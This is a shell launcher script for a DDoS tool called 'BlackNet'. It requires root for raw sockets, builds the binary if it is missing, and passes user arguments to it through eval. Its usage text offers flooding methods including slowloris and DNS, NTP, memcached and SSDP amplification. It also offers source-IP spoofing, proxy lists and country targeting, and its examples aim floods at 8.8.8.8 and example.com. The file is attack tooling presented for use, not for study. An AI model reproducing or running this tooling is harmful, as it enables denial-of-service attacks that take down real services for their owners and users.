#!/bin/bash

# BlackNet DDoS Toolkit - Run Script

# Check if running as root (required for raw sockets)
if [ "$EUID" -ne 0 ]; then 
    echo "[-] Please run as root (raw sockets require root privileges)"
    exit 1
fi

# Check if built
if [ ! -f "blacknet" ]; then
    echo "[-] BlackNet not found. Building..."
    ./scripts/build.sh
fi

# Parse arguments
if [ $# -eq 0 ]; then
    echo "Usage: ./run.sh [OPTIONS] <target>"
    echo ""
    echo "Options:"
    echo "  -m, --method METHOD    Attack method (udp, tcp, http, https, icmp, slowloris, dns, ntp, mem, ssdp)"
    echo "  -p, --port PORT        Target port"
    echo "  -t, --threads N        Number of threads"
    echo "  -d, --duration SEC     Attack duration in seconds"
    echo "  -r, --rate RATE        Packets per second"
    echo "  -g, --geo COUNTRY      Target specific country"
    echo "  -P, --proxy FILE       Use proxy list"
    echo "  --rand-source          Randomize source IP"
    echo "  --rand-port            Randomize source port"
    echo ""
    echo "Examples:"
    echo "  ./run.sh -m udp -t 500 -d 60 192.168.1.1"
    echo "  ./run.sh -m http -p 443 example.com"
    echo "  ./run.sh -m tcp -g US -t 200 8.8.8.8"
    exit 1
fi

# Build command
CMD="./blacknet"

# Add all arguments
for arg in "$@"; do
    CMD="$CMD \"$arg\""
done

# Run
echo "[+] Starting BlackNet DDoS Toolkit..."
echo "[+] Command: $CMD"
echo ""

eval $CMD
